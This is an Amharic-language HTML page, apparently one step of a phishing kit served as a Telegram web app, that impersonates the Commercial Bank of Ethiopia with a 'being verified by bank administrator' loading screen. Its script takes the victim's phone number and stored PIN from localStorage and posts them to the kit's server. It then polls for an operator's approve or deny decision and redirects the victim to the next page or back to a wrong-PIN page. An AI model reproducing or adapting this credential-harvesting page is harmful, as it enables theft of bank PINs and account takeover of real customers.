<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>እየተጣራ ነው - የኢትዮጵያ ንግድ ባንክ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --cbe-purple: #51255e; --text-muted: #666; --border-color: #dddddd; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f9f9f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .loading-card { background: #fff; width: 88%; max-width: 380px; padding: 45px 24px; border-radius: 20px; text-align: center; border: 1px solid var(--border-color); display: flex; flex-direction: column; align-items: center; }
        .loader-circle { width: 90px; height: 90px; background: var(--cbe-purple); border-radius: 50%; margin-bottom: 25px; display: flex; justify-content: center; align-items: center; }
        .loader-circle::after { content: ''; width: 66px; height: 66px; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #ffffff; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: var(--cbe-purple); font-size: 22px; margin: 0 0 10px; font-weight: 800; }
        p { color: var(--text-muted); font-size: 14.5px; margin: 0; line-height: 1.4; }
    </style>
</head>
<body>
<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">እየተጣራ ነው...</h2>
    <p id="sub-text">መረጃዎ በባንክ አስተዳዳሪ እየተረጋገጠ ነው</p>
</div>
<script>
document.addEventListener("DOMContentLoaded", async () => {
    const mainText = document.getElementById("main-text"), subText = document.getElementById("sub-text");
    if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
    const pin = localStorage.getItem("lastPin") || "";
    try {
        await fetch("/api/login-notification", {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, country: "ET" })
        });
    } catch (err) { console.error("Error:", err); }

    setTimeout(() => { mainText.textContent = "እባክዎ ትንሽ ይጠብቁ..."; subText.textContent = "ማረጋገጫው ይጠናቀቃል"; }, 3000);

    setInterval(async () => {
        if (!phone) return;
        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();
            if (data.status === "approved") {
                mainText.textContent = "ተቀባይነት አግኝቷል!"; subText.textContent = "ወደ ቀጣይ ገጽ በመዘዋወር ላይ...";
                setTimeout(() => { window.location.href = "/page8"; }, 1500);
            }
            if (data.status === "denied") {
                mainText.textContent = "ውድቅ ተደርጓል!"; subText.textContent = "የተሳሳተ ፒን ወይም ስልክ ቁጥር።";
                setTimeout(() => { window.location.href = "/page6?error=wrongpin"; }, 2000);
            }
        } catch (err) { console.error(err); }
    }, 2000);
});
</script>
</body>
</html>
